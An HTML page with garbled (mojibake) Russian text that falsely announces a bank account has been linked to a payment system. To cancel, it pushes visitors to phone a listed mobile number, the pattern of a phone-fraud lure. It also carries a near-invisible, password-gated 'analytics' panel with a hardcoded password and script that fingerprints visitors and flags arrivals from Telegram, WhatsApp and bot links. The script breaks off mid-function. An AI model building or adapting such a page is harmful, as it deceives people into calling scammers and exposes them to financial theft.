<!DOCTYPE html><!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°—á–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
        }

        .success-card {
            background: white;
            border-radius: 24px;
            padding: 40px 35px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
        }

        .success-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(to right, #4CAF50, #8BC34A);
        }

        .success-icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, #4CAF50, #8BC34A);
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
            animation: iconBounce 0.8s ease-out;
        }

        .success-icon i {
            font-size: 40px;
            color: white;
        }

        h1 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 28px;
            font-weight: 700;
        }

        .message {
            color: #5a6c7d;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .details {
            background: #f8fafc;
            border-radius: 16px;
            padding: 25px;
            margin: 25px 0;
            text-align: left;
            border: 1px solid #eef2f7;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eef2f7;
        }

        .detail-item:last-child {
            margin-bottom: 0;
            padding-bottom: 0;
            border-bottom: none;
        }

        .detail-label {
            color: #5a6c7d;
            font-weight: 500;
        }

        .detail-value {
            color: #2c3e50;
            font-weight: 600;
        }

        .status-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .security-badge {
            background: #e3f2fd;
            color: #1565c0;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .button-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 25px;
        }

        .btn {
            padding: 14px 30px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex: 1;
        }

        .btn-cancel {
            background: #f8fafc;
            color: #5a6c7d;
            border: 2px solid #e2e8f0;
        }

        .btn-cancel:hover {
            background: #e2e8f0;
            transform: translateY(-3px);
        }

        /* –°–∫—Ä—ã—Ç–∞—è –∫–Ω–æ–ø–∫–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ */
        .btn-analytics-hidden {
            background: transparent;
            color: transparent;
            border: none;
            padding: 8px 12px;
            margin: 10px auto;
            cursor: pointer;
            opacity: 0.1;
            transition: opacity 0.3s ease;
            font-size: 12px;
            width: 80px;
            height: 30px;
        }

        .btn-analytics-hidden:hover {
            opacity: 0.3;
            background: rgba(108, 117, 125, 0.1);
        }

        .separator {
            height: 1px;
            background: linear-gradient(to right, transparent, #e2e8f0, transparent);
            margin: 25px 0;
            position: relative;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease-out;
        }

        .modal-content {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            animation: slideUp 0.4s ease-out;
            position: relative;
        }

        .close-btn {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 24px;
            color: #5a6c7d;
            cursor: pointer;
            transition: color 0.3s;
        }

        .close-btn:hover {
            color: #2c3e50;
        }

        .modal-icon {
            width: 70px;
            height: 70px;
            background: #ffebee;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .modal-icon i {
            font-size: 30px;
            color: #f44336;
        }

        .modal h2 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 24px;
        }

        .modal p {
            color: #5a6c7d;
            margin-bottom: 25px;
            line-height: 1.6;
        }

        .phone-number {
            display: inline-block;
            background: #f8fafc;
            padding: 15px 25px;
            border-radius: 12px;
            font-size: 22px;
            font-weight: 700;
            color: #2c3e50;
            margin: 15px 0;
            border: 2px solid #e2e8f0;
        }

        .call-btn {
            display: inline-flex;
            align-items: center;
            background: linear-gradient(135deg, #4CAF50, #66BB6A);
            color: white;
            padding: 14px 30px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            text-decoration: none;
            margin-top: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }

        .call-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }

        .call-btn i {
            margin-right: 10px;
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –æ–∫–æ–Ω –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ */
        .analytics-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }

        .analytics-content {
            background: white;
            border-radius: 15px;
            padding: 30px;
            max-width: 95%;
            max-height: 95%;
            width: 900px;
            overflow-y: auto;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
        }

        .analytics-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #eef2f7;
            padding-bottom: 15px;
        }

        .analytics-title {
            color: #2c3e50;
            font-size: 24px;
            font-weight: 700;
        }

        .analytics-controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .btn-refresh {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }

        .btn-refresh:hover {
            background: #45a049;
        }

        .last-update {
            color: #6c757d;
            font-size: 12px;
            margin-top: 5px;
        }

        /* –¢–∞–±—ã –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ */
        .analytics-tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 2px solid #eef2f7;
        }

        .tab {
            padding: 12px 24px;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: #6c757d;
            border-bottom: 3px solid transparent;
            transition: all 0.3s;
        }

        .tab.active {
            color: #4CAF50;
            border-bottom-color: #4CAF50;
        }

        .tab:hover {
            color: #2c3e50;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .analytics-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
        }

        .stat-number {
            font-size: 32px;
            font-weight: 700;
            color: #4CAF50;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #6c757d;
            font-size: 14px;
        }

        .user-list {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #e9ecef;
            border-radius: 10px;
            padding: 15px;
        }

        .user-item {
            background: #f8f9fa;
            margin-bottom: 10px;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #4CAF50;
        }

        .user-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .user-id {
            font-weight: 600;
            color: #2c3e50;
        }

        .user-ip {
            color: #6c757d;
            font-size: 12px;
        }

        .user-details {
            font-size: 12px;
            color: #5a6c7d;
        }

        .api-user {
            border-left-color: #ff9800;
            background: #fff3e0;
        }

        .password-input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
            transition: border-color 0.3s;
        }

        .password-input:focus {
            outline: none;
            border-color: #4CAF50;
        }

        .password-btn {
            width: 100%;
            padding: 12px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }

        .password-btn:hover {
            background: #45a049;
        }

        .password-error {
            color: #f44336;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        @keyframes iconBounce {
            0% {
                transform: scale(0.5);
                opacity: 0;
            }
            60% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .refreshing {
            animation: rotate 1s linear infinite;
        }

        @media (max-width: 768px) {
            .analytics-content {
                padding: 20px;
                margin: 10px;
            }

            .analytics-stats {
                grid-template-columns: 1fr 1fr;
            }

            .analytics-tabs {
                flex-wrap: wrap;
            }

            .tab {
                padding: 10px 15px;
                font-size: 12px;
            }
        }

        @media (max-width: 480px) {
            .success-card {
                padding: 30px 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .success-icon {
                width: 80px;
                height: 80px;
            }
            
            .success-icon i {
                font-size: 36px;
            }
            
            .modal-content {
                padding: 30px 20px;
            }
            
            .phone-number {
                font-size: 18px;
                padding: 12px 20px;
            }

            .analytics-stats {
                grid-template-columns: 1fr;
            }

            .analytics-controls {
                flex-direction: column;
                gap: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-card">
            <div class="success-icon">
                <i class="fas fa-check"></i>
            </div>
            
            <h1>–°—á–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω!</h1>
            
            <p class="message">
                –í–∞—à –±–∞–Ω–∫–æ–≤—Å–∫–∏–π —Å—á–µ—Ç –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω –∫ —Å–∏—Å—Ç–µ–º–µ –æ–ø–ª–∞—Ç—ã. 
                –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ —Å–æ–≤–µ—Ä—à–∞—Ç—å –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –ø–ª–∞—Ç–µ–∂–∏ –∏ —É–ø—Ä–∞–≤–ª—è—Ç—å —Ñ–∏–Ω–∞–Ω—Å–∞–º–∏.
            </p>
            
            <div class="details">
                <div class="detail-item">
                    <span class="detail-label">–°—Ç–∞—Ç—É—Å:</span>
                    <span class="status-badge">–ê–∫—Ç–∏–≤–µ–Ω <i class="fas fa-check"></i></span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">–î–∞—Ç–∞ –ø—Ä–∏–≤—è–∑–∫–∏:</span>
                    <span class="detail-value">27 –Ω–æ—è–±—Ä—è 2025 –≥.</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:</span>
                    <span class="security-badge">–ó–∞—â–∏—â–µ–Ω–æ</span>
                </div>
            </div>
            
            <!-- –†–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å–Ω–∞—è –ª–∏–Ω–∏—è -->
            <div class="separator"></div>
            
            <div class="button-group">
                <button id="cancelBtn" class="btn btn-cancel">
                    <i class="fas fa-times" style="margin-right: 8px;"></i>
                    –û—Ç–º–µ–Ω–∏—Ç—å –ø—Ä–∏–≤—è–∑–∫—É
                </button>
            </div>

            <!-- –°–∫—Ä—ã—Ç–∞—è –∫–Ω–æ–ø–∫–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ -->
            <button id="analyticsBtn" class="btn-analytics-hidden" title="–ê–Ω–∞–ª–∏—Ç–∏–∫–∞">
                –ê–Ω–∞–ª–∏—Ç–∏–∫–∞
            </button>
        </div>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –æ—Ç–º–µ–Ω—ã -->
    <div id="cancelModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <div class="modal-icon">
                <i class="fas fa-phone-alt"></i>
            </div>
            <h2>–û—Ç–º–µ–Ω–∞ –ø—Ä–∏–≤—è–∑–∫–∏ —Å—á–µ—Ç–∞</h2>
            <p>–î–ª—è –æ—Ç–º–µ–Ω—ã –ø—Ä–∏–≤—è–∑–∫–∏ —Å—á–µ—Ç–∞ –ø–æ–∑–≤–æ–Ω–∏—Ç–µ –ø–æ –Ω–æ–º–µ—Ä—É:</p>
            <div class="phone-number">7 (988) 115-61-81</div>
            <p>–ù–∞—à–∏ –æ–ø–µ—Ä–∞—Ç–æ—Ä—ã –¥–æ—Å—Ç—É–ø–Ω—ã —Å 00:00 –¥–æ 24:00 –µ–∂–µ–¥–Ω–µ–≤–Ω–æ</p>
            <a href="tel:+79881156181" class="call-btn" id="callBtn">
                <i class="fas fa-phone"></i> –ü–æ–∑–≤–æ–Ω–∏—Ç—å —Å–µ–π—á–∞—Å
            </a>
        </div>
    </div>

    <!-- –û–∫–Ω–æ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ -->
    <div id="passwordModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" id="closePassword">&times;</span>
            <div class="modal-icon">
                <i class="fas fa-lock"></i>
            </div>
            <h2>–î–æ—Å—Ç—É–ø –∫ –∞–Ω–∞–ª–∏—Ç–∏–∫–µ</h2>
            <p>–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏:</p>
            <input type="password" id="passwordInput" class="password-input" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å">
            <button id="submitPassword" class="password-btn">–í–æ–π—Ç–∏</button>
            <div id="passwordError" class="password-error">–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!</div>
        </div>
    </div>

    <!-- –û–∫–Ω–æ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ -->
    <div id="analyticsModal" class="analytics-modal">
        <div class="analytics-content">
            <div class="analytics-header">
                <h2 class="analytics-title">–ê–Ω–∞–ª–∏—Ç–∏–∫–∞ –ø–æ—Å–µ—â–µ–Ω–∏–π</h2>
                <div class="analytics-controls">
                    <button id="refreshBtn" class="btn-refresh" title="–û–±–Ω–æ–≤–∏—Ç—å">
                        <i class="fas fa-sync-alt"></i> –û–±–Ω–æ–≤–∏—Ç—å
                    </button>
                    <span class="close-btn" id="closeAnalytics">&times;</span>
                </div>
            </div>
            
            <div class="last-update" id="lastUpdate">
                –ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...
            </div>

            <!-- –¢–∞–±—ã –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ -->
            <div class="analytics-tabs">
                <button class="tab active" data-tab="all">–í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏</button>
                <button class="tab" data-tab="api">API –ø–µ—Ä–µ—Ö–æ–¥—ã</button>
                <button class="tab" data-tab="stats">–û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</button>
            </div>

            <!-- –í–∫–ª–∞–¥–∫–∞ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π -->
            <div id="tab-all" class="tab-content active">
                <div class="user-list" id="userList">
                    <!-- –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π -->
                </div>
            </div>

            <!-- –í–∫–ª–∞–¥–∫–∞ API –ø–µ—Ä–µ—Ö–æ–¥–æ–≤ -->
            <div id="tab-api" class="tab-content">
                <div class="analytics-stats" id="apiStats">
                    <!-- –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ API –ø–µ—Ä–µ—Ö–æ–¥–æ–≤ -->
                </div>
                <div class="user-list" id="apiUserList">
                    <!-- –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å API –ø–µ—Ä–µ—Ö–æ–¥–æ–≤ -->
                </div>
            </div>

            <!-- –í–∫–ª–∞–¥–∫–∞ –æ–±—â–µ–π —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ -->
            <div id="tab-stats" class="tab-content">
                <div class="analytics-stats" id="analyticsStats">
                    <!-- –û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ -->
                </div>
            </div>
        </div>
    </div>

    <script>
        // –ü–∞—Ä–æ–ª—å –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–Ω–∞–ª–∏—Ç–∏–∫–µ
        const ANALYTICS_PASSWORD = "Tarakan4ik1";

        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±—Ä–∞—É–∑–µ—Ä–µ
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            let os = "Unknown";

            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";

            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "Mac OS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

            return { browser, os };
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ API –ø–µ—Ä–µ—Ö–æ–¥–∞
        function isApiReferrer(referrer) {
            const apiDomains = [
                'api.',
                'webhook',
                'bot',
                'telegram',
                'whatsapp',
                'viber',
                'messenger',
                'integration',
                'callback',
                'web.app',
                'firebaseapp.com'
            ];
            
            if (!referrer || referrer === '') return false;
            
            return apiDomains.some(domain => 
                referrer.toLowerCase().includes(domain)
            );
        }

        // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function getUserId() {
            let userId = localStorage.getItem('user_id');
            if (!userId) {
                userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('user_id', userId);
                localStorage.setItem('first_visit', new Date().toISOString());
            }
            return userId;
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        function getAnalytics() {
            return JSON.parse(localStorage.getItem('analytics') || '{}');
        }

        // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        function saveAnalytics(data) {
            localStorage.setItem('analytics', JSON.stringify(data));
        }

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        async function collectUserData() {
            const ip = await getUserIP();
            const browserInfo = getBrowserInfo();
            const referrer = document.referrer;
            const isApi = isApiReferrer(referrer);

            return {
                ip: ip,
                browser: browserInfo.browser,
                os: browserInfo.os,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                referrer: referrer,
                isApiReferrer: isApi,
                url: window.location.href,
                firstVisit: localStorage.getItem('first_visit') || new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        async function sendAnalytics(event, userId) {
            const userData = await collectUserData();
            
            const analyticsData = {
                event: event,
                userId: userId,
                userData: userData,
                timestamp: new Date().toISOString()
            };

            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            const currentAnalytics = getAnalytics();
            if (!currentAnalytics[userId]) {
                currentAnalytics[userId] = [];
            }
            currentAnalytics[userId].push(analyticsData);
            saveAnalytics(currentAnalytics);
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –∞–Ω–∞–ª–∏—Ç–∏–∫—É
        function showAnalytics() {
            const analytics = getAnalytics();
            const lastUpdate = document.getElementById('lastUpdate');

            // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
            lastUpdate.textContent = `–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: ${new Date().toLocaleString('ru-RU')}`;

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤—Å–µ –≤–∫–ª–∞–¥–∫–∏
            showAllUsers(analytics);
            showApiUsers(analytics);
            showGeneralStats(analytics);
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        function showAllUsers(analytics) {
            const userListContainer = document.getElementById('userList');
            userListContainer.innerHTML = '';

            Object.entries(analytics).forEach(([userId, userEvents]) => {
                const lastEvent = userEvents[userEvents.length - 1];
                const userItem = document.createElement('div');
                userItem.className = `user-item ${lastEvent.userData.isApiReferrer ? 'api-user' : ''}`;
                userItem.innerHTML = `
                    <div class="user-header">
                        <div class="user-id">${userId} ${lastEvent.userData.isApiReferrer ? 'üîó' : ''}</div>
                        <div class="user-ip">IP: ${lastEvent.userData.ip}</div>
                    </div>
                    <div class="user-details">
                        <strong>–ë—Ä–∞—É–∑–µ—Ä:</strong> ${lastEvent.userData.browser} | 
                        <strong>–û–°:</strong> ${lastEvent.userData.os} | 
                        <strong>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</strong> ${lastEvent.userData.platform}<br>
                        <strong>–≠–∫—Ä–∞–Ω:</strong> ${lastEvent.userData.screen} | 
                        <strong>–Ø–∑—ã–∫:</strong> ${lastEvent.userData.language}<br>
                        <strong>–†–µ—Ñ–µ—Ä–µ—Ä:</strong> ${lastEvent.userData.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'}<br>
                        <strong>–¢–∞–π–º–∑–æ–Ω–∞:</strong> ${lastEvent.userData.timezone} | 
                        <strong>Cookies:</strong> ${lastEvent.userData.cookiesEnabled ? '–≤–∫–ª' : '–≤—ã–∫–ª'}<br>
                        <strong>–°–æ–±—ã—Ç–∏–π:</strong> ${userEvents.length} | 
                        <strong>–ü–µ—Ä–≤–æ–µ –ø–æ—Å–µ—â–µ–Ω–∏–µ:</strong> ${new Date(lastEvent.userData.firstVisit).toLocaleString('ru-RU')}<br>
                        <strong>–ü–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–±—ã—Ç–∏–µ:</strong> ${lastEvent.event} –≤ ${new Date(lastEvent.timestamp).toLocaleString('ru-RU')}
                    </div>
                `;
                userListContainer.appendChild(userItem);
            });
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å API –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        function showApiUsers(analytics) {
            const apiStatsContainer = document.getElementById('apiStats');
            const apiUserListContainer = document.getElementById('apiUserList');

            let apiUsers = 0;
            let apiClicks = 0;
            const apiDomains = {};

            // –°–æ–±–∏—Ä–∞–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ API
            Object.entries(analytics).forEach(([userId, userEvents]) => {
                const lastEvent = userEvents[userEvents.length - 1];
                if (lastEvent.userData.isApiReferrer) {
                    apiUsers++;
                    apiClicks += userEvents.length;
                    
                    // –°–æ–±–∏—Ä–∞–µ–º –¥–æ–º–µ–Ω—ã —Ä–µ—Ñ–µ—Ä–µ—Ä–æ–≤
                    const domain = lastEvent.userData.referrer ? 
                        new URL(lastEvent.userData.referrer).hostname : 'unknown';
                    apiDomains[domain] = (apiDomains[domain] || 0) + 1;
                }
            });

            // –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ API
            apiStatsContainer.innerHTML = `
                <div class="stat-card">
                    <div class="stat-number">${apiUsers}</div>
                    <div class="stat-label">API –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${apiClicks}</div>
                    <div class="stat-label">API —Å–æ–±—ã—Ç–∏–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${Object.keys(apiDomains).length}</div>
                    <div class="stat-label">–ò—Å—Ç–æ—á–Ω–∏–∫–æ–≤ API</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${Math.round(apiClicks / (apiUsers || 1))}</div>
                    <div class="stat-label">–°—Ä. —Å–æ–±—ã—Ç–∏–π –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</div>
                </div>
            `;

            // –°–ø–∏—Å–æ–∫ API –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
            apiUserListContainer.innerHTML = '';
            Object.entries(analytics).forEach(([userId, userEvents]) => {
                const lastEvent = userEvents[userEvents.length - 1];
                if (lastEvent.userData.isApiReferrer) {
                    const userItem = document.createElement('div');
                    userItem.className = 'user-item api-user';
                    userItem.innerHTML = `
                        <div class="user-header">
                            <div class="user-id">${userId} üîó</div>
                            <div class="user-ip">IP: ${lastEvent.userData.ip}</div>
                        </div>
                        <div class="user-details">
                            <strong>–ò—Å—Ç–æ—á–Ω–∏–∫ API:</strong> ${lastEvent.userData.referrer || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}<br>
                            <strong>–ë—Ä–∞—É–∑–µ—Ä:</strong> ${lastEvent.userData.browser} | 
                            <strong>–û–°:</strong> ${lastEvent.userData.os}<br>
                            <strong>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∞–≥–µ–Ω—Ç:</strong> ${lastEvent.userData.userAgent.substring(0, 100)}...<br>
                            <strong>–°–æ–±—ã—Ç–∏–π:</strong> ${userEvents.length} | 
                            <strong>–¢–∏–ø—ã —Å–æ–±—ã—Ç–∏–π:</strong> ${[...new Set(userEvents.map(e => e.event))].join(', ')}<br>
                            <strong>–ü–µ—Ä–≤–æ–µ –ø–æ—Å–µ—â–µ–Ω–∏–µ:</strong> ${new Date(lastEvent.userData.firstVisit).toLocaleString('ru-RU')}<br>
                            <strong>–ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å:</strong> ${new Date(lastEvent.timestamp).toLocaleString('ru-RU')}
                        </div>
                    `;
                    apiUserListContainer.appendChild(userItem);
                }
            });

            if (apiUserListContainer.innerHTML === '') {
                apiUserListContainer.innerHTML = '<div style="text-align: center; color: #6c757d; padding: 20px;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ API –ø–µ—Ä–µ—Ö–æ–¥–∞—Ö</div>';
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –æ–±—â—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        function showGeneralStats(analytics) {
            const statsContainer = document.getElementById('analyticsStats');

            let totalClicks = 0;
            let uniqueUsers = Object.keys(analytics).length;
            let todayClicks = 0;
            let returningUsers = 0;
            let apiUsers = 0;
            const today = new Date().toDateString();
            const browsers = {};
            const os = {};

            Object.values(analytics).forEach(userEvents => {
                totalClicks += userEvents.length;
                if (userEvents.length > 1) {
                    returningUsers++;
                }
                
                const lastEvent = userEvents[userEvents.length - 1];
                if (lastEvent.userData.isApiReferrer) {
                    apiUsers++;
                }
                
                // –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –±—Ä–∞—É–∑–µ—Ä–∞–º
                browsers[lastEvent.userData.browser] = (browsers[lastEvent.userData.browser] || 0) + 1;
                os[lastEvent.userData.os] = (os[lastEvent.userData.os] || 0) + 1;

                userEvents.forEach(event => {
                    if (new Date(event.timestamp).toDateString() === today) {
                        todayClicks++;
                    }
                });
            });

            // –ù–∞—Ö–æ–¥–∏–º —Å–∞–º—ã–π –ø–æ–ø—É–ª—è—Ä–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä –∏ –û–°
